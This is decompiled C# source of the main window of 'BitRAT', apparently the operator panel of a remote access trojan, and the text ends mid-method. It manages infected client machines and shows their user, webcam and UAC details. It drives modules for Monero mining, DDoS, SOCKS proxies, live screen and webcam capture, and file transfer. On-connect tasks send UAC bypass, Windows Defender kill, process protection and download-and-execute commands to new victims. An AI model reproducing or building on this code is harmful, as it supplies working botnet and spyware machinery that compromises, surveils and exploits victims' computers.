﻿using System;
using System.Collections;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;
using BitRAT;
using BitRAT.My;
using BrightIdeasSoftware;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Zeroit.Framework.Progress;

// Token: 0x0200015E RID: 350
[DesignerGenerated]
public sealed partial class fMain : Form
{
	// Token: 0x06001359 RID: 4953 RVA: 0x00089B7C File Offset: 0x00087D7C
	public fMain()
	{
		base.Load += this.fMain_Load;
		base.SizeChanged += this.fMain_SizeChanged;
		base.Closing += this.fMain_Closing;
		base.Resize += this.fMain_Resize;
		this.cIPInfo_0 = new cIPInfo();
		this.ipendPoint_0 = new IPEndPoint(IPAddress.Any, 0);
		this.concurrentStack_0 = new ConcurrentStack<CClient>();
		this.concurrentStack_1 = new ConcurrentStack<CClient>();
		this.concurrentStack_2 = new ConcurrentStack<CClient>();
		this.InitializeComponent();
	}

	// Token: 0x0600135A RID: 4954 RVA: 0x0000A915 File Offset: 0x00008B15
	private GClass5 vmethod_0()
	{
		return this.gclass5_0;
	}

	// Token: 0x0600135B RID: 4955 RVA: 0x00089C1C File Offset: 0x00087E1C
	[MethodImpl(MethodImplOptions.Synchronized)]
	private void vmethod_1(GClass5 gclass5_2)
	{
		GClass5.GDelegate5 gdelegate5_ = new GClass5.GDelegate5(this.method_30);
		GClass5.GDelegate7 gdelegate7_ = new GClass5.GDelegate7(this.method_31);
		GClass5.GDelegate6 gdelegate6_ = new GClass5.GDelegate6(this.method_32);
		GClass5 gclass = this.gclass5_0;
		if (gclass != null)
		{
			gclass.method_1(gdelegate5_);
			gclass.method_3(gdelegate7_);
			gclass.method_5(gdelegate6_);
		}
		this.gclass5_0 = gclass5_2;
		gclass = this.gclass5_0;
		if (gclass != null)
		{
			gclass.method_0(gdelegate5_);
			gclass.method_2(gdelegate7_);
			gclass.method_4(gdelegate6_);
		}
	}

	// Token: 0x0600135C RID: 4956 RVA: 0x0000A91D File Offset: 0x00008B1D
	private GClass5 vmethod_2()
	{
		return this.gclass5_1;
	}

	// Token: 0x0600135D RID: 4957 RVA: 0x00089C98 File Offset: 0x00087E98
	[MethodImpl(MethodImplOptions.Synchronized)]
	private void vmethod_3(GClass5 gclass5_2)
	{
		GClass5.GDelegate5 gdelegate5_ = new GClass5.GDelegate5(this.method_33);
		GClass5.GDelegate7 gdelegate7_ = new GClass5.GDelegate7(this.method_34);
		GClass5.GDelegate6 gdelegate6_ = new GClass5.GDelegate6(this.method_35);
		GClass5 gclass = this.gclass5_1;
		if (gclass != null)
		{
			gclass.method_1(gdelegate5_);
			gclass.method_3(gdelegate7_);
			gclass.method_5(gdelegate6_);
		}
		this.gclass5_1 = gclass5_2;
		gclass = this.gclass5_1;
		if (gclass != null)
		{
			gclass.method_0(gdelegate5_);
			gclass.method_2(gdelegate7_);
			gclass.method_4(gdelegate6_);
		}
	}

	// Token: 0x0600135E RID: 4958 RVA: 0x00089D14 File Offset: 0x00087F14
	private void method_0()
	{
		try
		{
			this.struct18_1.method_1(true);
			byte[] bytes = Encoding.UTF8.GetBytes("@");
			for (;;)
			{
				try
				{
					foreach (KeyValuePair<string, CClient> keyValuePair in Class130.concurrentDictionary_3)
					{
						if (keyValuePair.Value.bIsAuthenticated)
						{
							keyValuePair.Value.sock_async.method_6(bytes);
							CClient value = keyValuePair.Value;
							ref double ptr = ref value.stats_bytes_out;
							value.stats_bytes_out = ptr + 1.0;
							ptr = ref Class130.struct20_0.double_3;
							Class130.struct20_0.double_3 = ptr + 1.0;
							ptr = ref Class130.struct20_0.double_5;
							Class130.struct20_0.double_5 = ptr + 1.0;
						}
					}
				}
				finally
				{
					IEnumerator<KeyValuePair<string, CClient>> enumerator;
					if (enumerator != null)
					{
						enumerator.Dispose();
					}
				}
				Thread.Sleep(10000);
			}
		}
		catch (Exception ex)
		{
		}
	}

	// Token: 0x0600135F RID: 4959 RVA: 0x0000A925 File Offset: 0x00008B25
	public void method_1()
	{
		this.counterSample_0 = this.performanceCounter_0.NextSample();
	}

	// Token: 0x06001360 RID: 4960 RVA: 0x0000A938 File Offset: 0x00008B38
	private static string smethod_0()
	{
		return fMain.smethod_1(Process.GetCurrentProcess().Id);
	}

	// Token: 0x06001361 RID: 4961 RVA: 0x00089E14 File Offset: 0x00088014
	private static string smethod_1(int int_1)
	{
		try
		{
			foreach (string text in new PerformanceCounterCategory("Process").GetInstanceNames())
			{
				try
				{
					PerformanceCounter performanceCounter = new PerformanceCounter("Process", "ID Process", text, true);
					try
					{
						if (checked((int)performanceCounter.RawValue) == int_1)
						{
							return text;
						}
					}
					finally
					{
						((IDisposable)performanceCounter).Dispose();
					}
				}
				catch (Exception ex)
				{
				}
			}
			throw new Exception();
		}
		catch (Exception ex2)
		{
		}
		return string.Empty;
	}

	// Token: 0x06001362 RID: 4962 RVA: 0x00089EC0 File Offset: 0x000880C0
	public void method_2()
	{
		object[] object_ = new object[]
		{
			this
		};
		Class149.smethod_0().method_139(Class149.smethod_1(), ")&O7p*?6.B", object_);
	}

	// Token: 0x06001363 RID: 4963 RVA: 0x00089EF0 File Offset: 0x000880F0
	private void method_3()
	{
		object[] object_ = new object[]
		{
			this
		};
		Class149.smethod_0().method_139(Class149.smethod_1(), ")&O:0*?58)", object_);
	}

	// Token: 0x06001364 RID: 4964 RVA: 0x00089F20 File Offset: 0x00088120
	private void fMain_Load(object sender, EventArgs e)
	{
		object[] object_ = new object[]
		{
			this,
			sender,
			e
		};
		Class149.smethod_0().method_139(Class149.smethod_1(), ")&O9`*?:jr", object_);
	}

	// Token: 0x06001365 RID: 4965 RVA: 0x00089F58 File Offset: 0x00088158
	public void method_4()
	{
		object[] object_ = new object[]
		{
			this
		};
		Class149.smethod_0().method_139(Class149.smethod_1(), ")&O:(*?6XP", object_);
	}

	// Token: 0x06001366 RID: 4966 RVA: 0x00089F88 File Offset: 0x00088188
	public void method_5(bool bool_0)
	{
		if (base.InvokeRequired)
		{
			base.Invoke(new fMain.Delegate133(this.method_5), new object[]
			{
				bool_0
			});
			return;
		}
		try
		{
			if (bool_0)
			{
				this.vmethod_18().SmallImageList = Class130.imageList_1;
			}
			else
			{
				this.vmethod_18().SmallImageList = Class130.imageList_0;
				this.vmethod_18().GroupImageList = Class130.imageList_0;
			}
			this.vmethod_18().Columns[0].Width = Conversions.ToInteger(Interaction.IIf(bool_0, 260, 20));
		}
		catch (Exception ex)
		{
		}
	}

	// Token: 0x06001367 RID: 4967 RVA: 0x0008A048 File Offset: 0x00088248
	public void method_6()
	{
		object[] object_ = new object[]
		{
			this
		};
		Class149.smethod_0().method_139(Class149.smethod_1(), ")&O:P*?8E-", object_);
	}

	// Token: 0x06001368 RID: 4968 RVA: 0x0008A078 File Offset: 0x00088278
	public void method_7()
	{
		if (base.InvokeRequired)
		{
			base.Invoke(new fMain.Delegate128(this.method_7), new object[0]);
			return;
		}
		Class130.fSettings_0.Visible = true;
		this.method_117(Class135.smethod_0().LayoutTheme);
		Application.EnableVisualStyles();
		if (!Class130.struct18_4.method_0())
		{
			this.gclass2_0 = new GClass2(this);
			Class130.struct18_4.method_1(true);
		}
		base.Width = 1420;
		base.Height = 540;
		checked
		{
			this.vmethod_92().Left = (int)Math.Round(unchecked((double)base.Width / 2.0 - (double)this.vmethod_92().Width / 2.0));
			this.vmethod_92().Top = (int)Math.Round(unchecked((double)base.Height / 2.0 - (double)this.vmethod_92().Height / 2.0));
			this.vmethod_92().BringToFront();
			this.vmethod_92().Visible = true;
			this.vmethod_92().Animate = true;
			this.vmethod_92().Text = "Please wait...";
			foreach (string text in Directory.GetFiles(Application.StartupPath + "\\data\\media\\flags\\"))
			{
				Class130.imageList_0.Images.Add(Path.GetFileNameWithoutExtension(text), Image.FromFile(text));
			}
			foreach (string text2 in Directory.GetFiles(Application.StartupPath + "\\data\\media\\misc\\"))
			{
				Class130.imageList_0.Images.Add(Path.GetFileNameWithoutExtension(text2), Image.FromFile(text2));
			}
			foreach (string text3 in Directory.GetFiles(Application.StartupPath + "\\data\\media\\status\\"))
			{
				Class130.imageList_0.Images.Add(Path.GetFileNameWithoutExtension(text3), Image.FromFile(text3));
			}
			this.vmethod_18().VirtualMode = true;
			this.vmethod_18().View = View.Details;
			this.vmethod_18().FullRowSelect = true;
			this.vmethod_18().SmallImageList = Class130.imageList_0;
			this.vmethod_18().GroupImageList = Class130.imageList_0;
			this.vmethod_18().OwnerDraw = true;
			this.vmethod_18().UseCellFormatEvents = true;
			this.vmethod_18().Columns[0].Width = Conversions.ToInteger(Interaction.IIf(Class135.smethod_0().UIThumbnails, 260, 20));
			this.vmethod_18().Columns[1].Width = 140;
			this.vmethod_18().Columns[2].Width = 90;
			this.vmethod_18().Columns[3].Width = 160;
			this.vmethod_18().Columns[4].Width = 80;
			this.vmethod_18().Columns[5].Width = 100;
			this.vmethod_18().Columns[6].Width = 120;
			this.vmethod_18().Columns[7].Width = 100;
			this.vmethod_18().Columns[8].Width = 80;
			this.vmethod_18().Columns[9].Width = 80;
			this.vmethod_18().Columns[10].Width = 140;
			this.vmethod_18().Columns[11].Width = 40;
			this.vmethod_18().Columns[12].Width = 50;
			this.vmethod_18().Columns[13].Width = 40;
			this.vmethod_18().Columns[14].Width = 50;
			this.vmethod_18().Columns[15].Width = 70;
			this.vmethod_18().Columns[16].Width = 16;
			this.vmethod_18().Update();
			this.int_0 = (int)this.vmethod_18().Handle;
			Class136.smethod_8(Class135.smethod_0().Gridlines);
			this.cIPInfo_0.method_0(this);
			string text4 = "Loading GEO database. Please wait...";
			this.method_39(ref text4);
		}
	}

	// Token: 0x06001369 RID: 4969 RVA: 0x0008A4F0 File Offset: 0x000886F0
	public void method_8()
	{
		object[] object_ = new object[]
		{
			this
		};
		Class149.smethod_0().method_139(Class149.smethod_1(), ")&O:]*?7Wl", object_);
	}

	// Token: 0x0600136A RID: 4970 RVA: 0x0000A949 File Offset: 0x00008B49
	public long method_9()
	{
		return (long)this.vmethod_18().Items.Count;
	}

	// Token: 0x0600136B RID: 4971 RVA: 0x0008A520 File Offset: 0x00088720
	public void method_10()
	{
		if (this.vmethod_18().InvokeRequired)
		{
			this.vmethod_18().Invoke(new fMain.Delegate139(this.method_10), new object[0]);
			return;
		}
		try
		{
			long long_ = (long)this.vmethod_18().SelectedObjects.Count;
			this.struct7_0.method_1(long_);
		}
		catch (Exception ex)
		{
		}
	}

	// Token: 0x0600136C RID: 4972 RVA: 0x0008A598 File Offset: 0x00088798
	public void method_11()
	{
		try
		{
			if (Class135.smethod_0().ShowGroups)
			{
				if (Operators.CompareString(this.vmethod_54().Text, "Show", true) == 0)
				{
					Class135.smethod_0().GroupSubtitles = true;
					this.vmethod_54().Text = "Hide";
				}
				else
				{
					Class135.smethod_0().GroupSubtitles = false;
					this.vmethod_54().Text = "Show";
				}
				try
				{
					foreach (OLVGroup olvgroup in this.vmethod_18().OLVGroups)
					{
						olvgroup.TitleImage = RuntimeHelpers.GetObjectValue(olvgroup.Key);
						OLVGroup olvgroup2 = olvgroup;
						bool showGroups = Class135.smethod_0().ShowGroups;
						object empty = string.Empty;
						string str = "Clients: ";
						OLVGroup olvgroup3;
						string key = Conversions.ToString((olvgroup3 = olvgroup).Key);
						long value = this.method_13(ref key);
						olvgroup3.Key = key;
						olvgroup2.Subtitle = Conversions.ToString(Interaction.IIf(showGroups, empty, str + Conversions.ToString(value)));
					}
				}
				finally
				{
					IEnumerator<OLVGroup> enumerator;
					if (enumerator != null)
					{
						enumerator.Dispose();
					}
				}
				this.vmethod_18().RebuildColumns();
				Class135.smethod_0().Save();
			}
		}
		catch (Exception ex)
		{
			string message = ex.Message;
		}
	}

	// Token: 0x0600136D RID: 4973 RVA: 0x0008A6F4 File Offset: 0x000888F4
	public void method_12()
	{
		if (Class135.smethod_0().ShowGroups)
		{
			this.vmethod_18().ShowGroups = true;
			try
			{
				Class135.smethod_0().GroupIndex = 14;
				this.vmethod_18().Sort(Class135.smethod_0().GroupIndex);
			}
			catch (Exception ex)
			{
				Class135.smethod_0().GroupIndex = 14;
				this.vmethod_18().Sort(Class135.smethod_0().GroupIndex);
			}
			this.vmethod_52().Enabled = true;
			Class135.smethod_0().ShowGroups = true;
			this.vmethod_50().Text = "Hide";
		}
		else
		{
			this.vmethod_18().ShowGroups = false;
			this.vmethod_50().Text = "Show";
			this.vmethod_52().Enabled = false;
			Class135.smethod_0().ShowGroups = false;
		}
		Class135.smethod_0().Save();
	}

	// Token: 0x0600136E RID: 4974 RVA: 0x0008A7E4 File Offset: 0x000889E4
	public long method_13(ref string string_0)
	{
		checked
		{
			long num;
			try
			{
				foreach (KeyValuePair<string, CClient> keyValuePair in Class130.concurrentDictionary_3)
				{
					if (!keyValuePair.Value.FILE_TRANSFER_ACTIVE & !keyValuePair.Value.SCREENLIVE_ACTIVE & !keyValuePair.Value.SCREENLIVE_SECONDARY_ACTIVE & !keyValuePair.Value.WEBCAMSTREAM_ACTIVE & !keyValuePair.Value.REMOTE_BROWSER_ACTIVE & !keyValuePair.Value.SOCKET_COMMAND_ACTIVE)
					{
						if (Operators.CompareString(string_0, keyValuePair.Value.sIP, true) == 0)
						{
							num += 1L;
						}
						else if (Operators.CompareString(string_0, keyValuePair.Value.sInOut, true) == 0)
						{
							num += 1L;
						}
						else if (Operators.CompareString(string_0, keyValuePair.Value.sUser, true) == 0)
						{
							num += 1L;
						}
						else if (Operators.CompareString(string_0, keyValuePair.Value.sBandwidthDL, true) == 0)
						{
							num += 1L;
						}
						else if (Operators.CompareString(string_0, keyValuePair.Value.sOperatingSystem, true) == 0)
						{
							num += 1L;
						}
						else if (Operators.CompareString(string_0, keyValuePair.Value.sCam, true) == 0)
						{
							num += 1L;
						}
						else if (Operators.CompareString(string_0, keyValuePair.Value.sCountry, true) == 0)
						{
							num += 1L;
						}
						else if (Operators.CompareString(string_0, keyValuePair.Value.sPing, true) == 0)
						{
							num += 1L;
						}
						else if (Operators.CompareString(string_0, keyValuePair.Value.sSpeed, true) == 0)
						{
							num += 1L;
						}
						else if (Operators.CompareString(string_0, keyValuePair.Value.sCPUusage, true) == 0)
						{
							num += 1L;
						}
						else if (Operators.CompareString(string_0, keyValuePair.Value.sRAM, true) == 0)
						{
							num += 1L;
						}
						else if (Operators.CompareString(string_0, keyValuePair.Value.sSystem, true) == 0)
						{
							num += 1L;
						}
						else if (Operators.CompareString(string_0, keyValuePair.Value.sWindowTitle, true) == 0)
						{
							num += 1L;
						}
					}
				}
			}
			finally
			{
				IEnumerator<KeyValuePair<string, CClient>> enumerator;
				if (enumerator != null)
				{
					enumerator.Dispose();
				}
			}
			return num;
		}
	}

	// Token: 0x0600136F RID: 4975 RVA: 0x0008AA90 File Offset: 0x00088C90
	public void method_14(ref string string_0, ref bool bool_0, ref bool bool_1)
	{
		try
		{
			foreach (KeyValuePair<string, cTransfer> keyValuePair in Class130.concurrentDictionary_0)
			{
				if (Operators.CompareString(keyValuePair.Value.USER_KEY, string_0, true) == 0 & keyValuePair.Value.TRANSFER_ACTIVE)
				{
					keyValuePair.Value.pending_dc_timeout = bool_1;
					keyValuePair.Value.pending_dc = bool_0;
					Class130.fTransferManager_0.concurrentStack_1.Push(keyValuePair.Value);
				}
			}
		}
		finally
		{
			IEnumerator<KeyValuePair<string, cTransfer>> enumerator;
			if (enumerator != null)
			{
				enumerator.Dispose();
			}
		}
	}

	// Token: 0x06001370 RID: 4976 RVA: 0x0008AB30 File Offset: 0x00088D30
	public void method_15(ref string string_0, ref bool bool_0, ref bool bool_1)
	{
		if (Class130.concurrentDictionary_4.ContainsKey(string_0))
		{
			Class130.concurrentDictionary_4[string_0].pending_dc_timeout = bool_1;
			Class130.concurrentDictionary_4[string_0].pending_dc = bool_0;
			Class130.fMinerXMR_0.concurrentStack_1.Push(Class130.concurrentDictionary_4[string_0]);
		}
	}

	// Token: 0x06001371 RID: 4977 RVA: 0x0008AB8C File Offset: 0x00088D8C
	public void method_16(ref string string_0, ref bool bool_0, ref bool bool_1)
	{
		if (Class130.concurrentDictionary_5.ContainsKey(string_0))
		{
			Class130.concurrentDictionary_5[string_0].pending_dc_timeout = bool_1;
			Class130.concurrentDictionary_5[string_0].pending_dc = bool_0;
			Class130.fDDOS_0.concurrentStack_1.Push(Class130.concurrentDictionary_5[string_0]);
		}
	}

	// Token: 0x06001372 RID: 4978 RVA: 0x0008ABE8 File Offset: 0x00088DE8
	public void method_17(ref string string_0, ref bool bool_0, ref bool bool_1)
	{
		if (Class130.concurrentDictionary_6.ContainsKey(string_0))
		{
			Class130.concurrentDictionary_6[string_0].pending_dc_timeout = bool_1;
			Class130.concurrentDictionary_6[string_0].pending_dc = bool_0;
			Class130.fSocks5_0.concurrentStack_1.Push(Class130.concurrentDictionary_6[string_0]);
		}
	}

	// Token: 0x06001373 RID: 4979 RVA: 0x0008AC44 File Offset: 0x00088E44
	public void method_18(ref string string_0, ref bool bool_0, ref bool bool_1)
	{
		if (Class130.concurrentDictionary_7.ContainsKey(string_0))
		{
			Class130.concurrentDictionary_7[string_0].pending_dc_timeout = bool_1;
			Class130.concurrentDictionary_7[string_0].pending_dc = bool_0;
			Class130.fSocks4R_0.concurrentStack_1.Push(Class130.concurrentDictionary_7[string_0]);
		}
	}

	// Token: 0x06001374 RID: 4980 RVA: 0x0008ACA0 File Offset: 0x00088EA0
	public void method_19(ref CClient cclient_1, ref long long_0, ref long long_1)
	{
		checked
		{
			try
			{
				if (this.vmethod_18().InvokeRequired)
				{
					this.vmethod_18().Invoke(new fMain.Delegate123(this.method_19), new object[]
					{
						cclient_1,
						long_0,
						long_1
					});
				}
				else if (long_1 > 0L)
				{
					cclient_1.lLastPacketTimeStamp = long_1;
					cclient_1.sPing = Conversions.ToString(Math.Abs(long_0 - cclient_1.lLastPacketTimeStamp)) + " ms";
					cclient_1.lPing = Math.Abs(long_0 - cclient_1.lLastPacketTimeStamp);
					CClient cclient = cclient_1;
					double stats_bytes_in = cclient_1.stats_bytes_in;
					bool flag = false;
					ref bool ptr = ref flag;
					double num = stats_bytes_in;
					CClient cclient2 = cclient;
					int num2;
					string text2;
					int num3;
					object obj;
					try
					{
						ProjectData.ClearProjectError();
						num2 = 2;
						string text = string.Empty;
						if (num >= 1099511627776.0)
						{
							text = Strings.Format(num / 1024.0 / 1024.0 / 1024.0 / 1024.0, "#0.00") + " TiB";
						}
						else if (num >= 1073741824.0)
						{
							text = Strings.Format(num / 1024.0 / 1024.0 / 1024.0, "#0.00") + " GiB";
						}
						else if (num >= 1048576.0)
						{
							text = Strings.Format(num / 1024.0 / 1024.0, "#0.00") + " MiB";
						}
						else if (num >= 1024.0)
						{
							text = Strings.Format(num / 1024.0, "#0.00") + " KiB";
						}
						else if (num < 1024.0)
						{
							text = Conversions.ToString(Conversion.Fix(num)) + " B";
						}
						if (ptr)
						{
							text = Strings.Split(text, " ", -1, CompareMethod.Text)[0];
						}
						if (text.Length > 0)
						{
							text2 = text;
						}
						else
						{
							text2 = " 0 B";
						}
						IL_21D:
						goto IL_26C;
						IL_21F:
						text2 = "0 B";
						goto IL_21D;
						IL_227:
						num3 = -1;
						@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num2);
						IL_23D:;
					}
					catch when (endfilter(obj is Exception & num2 != 0 & num3 == 0))
					{
						Exception ex = (Exception)obj2;
						goto IL_227;
					}
					throw ProjectData.CreateProjectError(-2146828237);
					IL_26C:
					if (num3 != 0)
					{
						ProjectData.ClearProjectError();
					}
					string text3 = text2;
					CClient cclient3 = cclient2;
					string text4 = text3;
					string text5 = "/";
					double stats_bytes_out = cclient_1.stats_bytes_out;
					flag = false;
					ptr = ref flag;
					num = stats_bytes_out;
					string str = text5;
					string str2 = text4;
					CClient cclient4 = cclient3;
					object obj3;
					try
					{
						ProjectData.ClearProjectError();
						num2 = 2;
						string text = string.Empty;
						if (num >= 1099511627776.0)
						{
							text = Strings.Format(num / 1024.0 / 1024.0 / 1024.0 / 1024.0, "#0.00") + " TiB";
						}
						else if (num >= 1073741824.0)
						{
							text = Strings.Format(num / 1024.0 / 1024.0 / 1024.0, "#0.00") + " GiB";
						}
						else if (num >= 1048576.0)
						{
							text = Strings.Format(num / 1024.0 / 1024.0, "#0.00") + " MiB";
						}
						else if (num >= 1024.0)
						{
							text = Strings.Format(num / 1024.0, "#0.00") + " KiB";
						}
						else if (num < 1024.0)
						{
							text = Conversions.ToString(Conversion.Fix(num)) + " B";
						}
						if (ptr)
						{
							text = Strings.Split(text, " ", -1, CompareMethod.Text)[0];
						}
						if (text.Length > 0)
						{
							text2 = text;
						}
						else
						{
							text2 = " 0 B";
						}
						IL_403:
						goto IL_452;
						IL_405:
						text2 = "0 B";
						goto IL_403;
						IL_40D:
						num3 = -1;
						@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num2);
						IL_423:;
					}
					catch when (endfilter(obj3 is Exception & num2 != 0 & num3 == 0))
					{
						Exception ex2 = (Exception)obj4;
						goto IL_40D;
					}
					throw ProjectData.CreateProjectError(-2146828237);
					IL_452:
					if (num3 != 0)
					{
						ProjectData.ClearProjectError();
					}
					string str3 = text2;
					cclient4.sInOut = str2 + str + str3;
				}
			}
			catch (Exception ex3)
			{
			}
		}
	}

	// Token: 0x06001375 RID: 4981 RVA: 0x0008B17C File Offset: 0x0008937C
	public void method_20(ref CClient cclient_1, ref string string_0, ref string string_1, ref string string_2, ref string string_3, ref string string_4, ref string string_5, ref string string_6, ref string string_7, ref string string_8, ref string string_9, ref string string_10, ref string string_11, ref string string_12, ref string string_13, ref string string_14, ref string string_15)
	{
		if (this.vmethod_18().InvokeRequired)
		{
			this.vmethod_18().Invoke(new fMain.Delegate143(this.method_20), new object[]
			{
				cclient_1,
				string_0,
				string_1,
				string_2,
				string_3,
				string_4,
				string_5,
				string_6,
				string_7,
				string_8,
				string_9,
				string_10,
				string_11,
				string_12,
				string_13,
				string_14,
				string_15
			});
			return;
		}
		if (Strings.Len(cclient_1.sCountry) > 0)
		{
			ListView listView = this.vmethod_18();
			this.method_38(ref listView, ref cclient_1, ref string_4, ref string_5, ref string_6, ref string_7, ref string_8, ref string_10, ref string_14);
			this.vmethod_19((FastObjectListView)listView);
			return;
		}
		cIPInfo.STRUCT_GEO struct_GEO = this.cIPInfo_0.method_3(cclient_1.sIP);
		cclient_1.bIsAuthenticated = true;
		cclient_1.bJustConnected = true;
		cclient_1.sSettingPassword = string_0;
		cclient_1.sCountry = struct_GEO.CountryCode;
		cclient_1.ICO_FLAG = Class130.imageList_0.Images[cclient_1.sCountry];
		if (cclient_1.IS_SSL)
		{
			cclient_1.ICO_TYPE = Class130.imageList_0.Images["ssl"];
		}
		else
		{
			cclient_1.ICO_TYPE = Class130.imageList_0.Images["tor"];
		}
		cclient_1.sOperatingSystem = string_3;
		cclient_1.sWindowTitle = Encoding.UTF8.GetString(Convert.FromBase64String(string_4));
		cclient_1.sUser = string_1;
		cclient_1.sSystem = string_2;
		cclient_1.sIdle = string_5;
		cclient_1.sIdleMs = string_6;
		cclient_1.sWebcam = string_7;
		cclient_1.sCPUusage = string_8 + "%";
		cclient_1.lCPUusage = Conversions.ToLong(string_8);
		cclient_1.sRAM = string_9;
		cclient_1.sBandwidthDL = string_10;
		cclient_1.sPID = string_11;
		cclient_1.sLANIP = string_12;
		cclient_1.sUACLevel = string_15;
		cclient_1.bPowerOffAllowed = Conversions.ToBoolean(Interaction.IIf(Operators.CompareString(string_13, "1", true) == 0, true, false));
		if (!Class135.smethod_0().UIThumbnails)
		{
			cclient_1.ICO_STATUS = (Image)Interaction.IIf(Conversions.ToDouble(cclient_1.sIdleMs) > 20000.0, Class130.imageList_0.Images["away"], Class130.imageList_0.Images["online"]);
		}
		this.concurrentStack_0.Push(cclient_1);
		cclient_1.sock_async.method_6(Encoding.UTF8.GetBytes("@"));
		CClient cclient = cclient_1;
		ref double ptr = ref cclient.stats_bytes_out;
		cclient.stats_bytes_out = ptr + 1.0;
		ptr = ref Class130.struct20_0.double_3;
		Class130.struct20_0.double_3 = ptr + 1.0;
		ptr = ref Class130.struct20_0.double_5;
		Class130.struct20_0.double_5 = ptr + 1.0;
		string sKey = cclient_1.sKey;
		string string_16 = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(string.Concat(new string[]
		{
			"settings|",
			cclient_1.sKey,
			"|",
			Conversions.ToString(Class135.smethod_0().TransfersRecvBytes),
			"|",
			Conversions.ToString(Class135.smethod_0().TransfersSendBytes),
			"|",
			Conversions.ToString(Class135.smethod_0().TransfersConcurrentMax),
			"|",
			Conversions.ToString(Class135.smethod_0().MaxBandwidthRateIn),
			"|"
		}), Interaction.IIf(Class135.smethod_0().TransferReplaceExisting, "1", "0")), "|"), Interaction.IIf(Class135.smethod_0().TransferReplaceFilesModified, "1", "0")), "|"), Interaction.IIf(Class135.smethod_0().UIThumbnails, "1", "0")));
		string string_17 = sKey;
		Class136.Class138 @class = new Class136.Class138();
		@class.string_0 = string_17;
		@class.string_1 = string_16;
		@class.long_0 = 0L;
		try
		{
			if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
			{
				new Thread(new ThreadStart(@class._Lambda$__0)).Start();
			}
		}
		catch (Exception ex)
		{
		}
		if (Class135.smethod_0().NetworkBandwidth.Length > 0)
		{
			string sKey2 = cclient_1.sKey;
			string_16 = "speedtest|" + Class135.smethod_0().NetworkBandwidth;
			string_17 = sKey2;
			@class = new Class136.Class138();
			@class.string_0 = string_17;
			@class.string_1 = string_16;
			@class.long_0 = 0L;
			try
			{
				if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
				{
					new Thread(new ThreadStart(@class._Lambda$__0)).Start();
				}
			}
			catch (Exception ex2)
			{
			}
		}
		if (Class135.smethod_0().ConNotifications)
		{
			new fBalloontip().method_1(cclient_1.sKey, "New connection", cclient_1.IP, cclient_1.USER, cclient_1.sWindowTitle, cclient_1.ICO_TYPE);
		}
		checked
		{
			if (Class130.fOnJoin_0 != null)
			{
				GClass7 gclass = Class130.fOnJoin_0.vmethod_8();
				int num = gclass.Items.Count - 1;
				int i = 0;
				while (i <= num)
				{
					string[] array = Strings.Split(Conversions.ToString(gclass.Items[i].Tag), "|", -1, CompareMethod.Text);
					string left = array[0];
					if (Operators.CompareString(left, "uac_bypass", true) != 0)
					{
						goto IL_69F;
					}
					if (Operators.CompareString(string_15.ToLower(), "admin", true) != 0)
					{
						string sKey3 = cclient_1.sKey;
						string text = Conversions.ToString(gclass.Items[i].Tag);
						long long_ = (long)Math.Round(Conversion.Val(gclass.Items[i].SubItems[2].Text));
						string_16 = text;
						string_17 = sKey3;
						@class = new Class136.Class138();
						@class.string_0 = string_17;
						@class.string_1 = string_16;
						@class.long_0 = long_;
						try
						{
							if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
							{
								new Thread(new ThreadStart(@class._Lambda$__0)).Start();
							}
							goto IL_EA0;
						}
						catch (Exception ex3)
						{
							goto IL_EA0;
						}
						goto IL_69F;
						IL_EA0:
						gclass.Items[i].SubItems[3].Text = Conversions.ToString(unchecked(Conversion.Val(gclass.Items[i].SubItems[3].Text) + 1.0));
					}
					IL_E97:
					i++;
					continue;
					IL_69F:
					if (Operators.CompareString(left, "wd_kill", true) == 0)
					{
						string sKey4 = cclient_1.sKey;
						string text2 = Conversions.ToString(gclass.Items[i].Tag);
						long long_ = (long)Math.Round(Conversion.Val(gclass.Items[i].SubItems[2].Text));
						string_16 = text2;
						string_17 = sKey4;
						@class = new Class136.Class138();
						@class.string_0 = string_17;
						@class.string_1 = string_16;
						@class.long_0 = long_;
						try
						{
							if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
							{
								new Thread(new ThreadStart(@class._Lambda$__0)).Start();
							}
						}
						catch (Exception ex4)
						{
						}
						gclass.Items[i].SubItems[3].Text = Conversions.ToString(unchecked(Conversion.Val(gclass.Items[i].SubItems[3].Text) + 1.0));
						goto IL_E97;
					}
					if (Operators.CompareString(left, "prc_protect", true) == 0)
					{
						string sKey5 = cclient_1.sKey;
						string text3 = Conversions.ToString(gclass.Items[i].Tag);
						long long_ = (long)Math.Round(Conversion.Val(gclass.Items[i].SubItems[2].Text));
						string_16 = text3;
						string_17 = sKey5;
						@class = new Class136.Class138();
						@class.string_0 = string_17;
						@class.string_1 = string_16;
						@class.long_0 = long_;
						try
						{
							if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
							{
								new Thread(new ThreadStart(@class._Lambda$__0)).Start();
							}
						}
						catch (Exception ex5)
						{
						}
						gclass.Items[i].SubItems[3].Text = Conversions.ToString(unchecked(Conversion.Val(gclass.Items[i].SubItems[3].Text) + 1.0));
						goto IL_E97;
					}
					if (Operators.CompareString(left, "dlexec", true) == 0)
					{
						string sKey6 = cclient_1.sKey;
						string text4 = Conversions.ToString(gclass.Items[i].Tag);
						long long_ = (long)Math.Round(Conversion.Val(gclass.Items[i].SubItems[2].Text));
						string_16 = text4;
						string_17 = sKey6;
						@class = new Class136.Class138();
						@class.string_0 = string_17;
						@class.string_1 = string_16;
						@class.long_0 = long_;
						try
						{
							if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
							{
								new Thread(new ThreadStart(@class._Lambda$__0)).Start();
							}
						}
						catch (Exception ex6)
						{
						}
						gclass.Items[i].SubItems[3].Text = Conversions.ToString(unchecked(Conversion.Val(gclass.Items[i].SubItems[3].Text) + 1.0));
						goto IL_E97;
					}
